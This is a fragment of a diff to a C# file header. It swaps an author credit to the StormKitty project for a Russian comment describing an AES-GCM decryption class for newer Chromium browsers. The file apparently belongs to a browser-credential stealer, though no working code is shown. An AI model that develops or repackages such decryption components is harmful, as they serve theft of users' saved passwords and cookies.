@@ -1,6 +1,6 @@
-﻿/* 
-    Author : LimerBoy
-    Github : github.com/LimerBoy/StormKitty
+﻿/*
+    Класс для расшифроки AES-GCM через BCrypt.
+    Необходим для новых хромиумов.
 */
 
 using System;
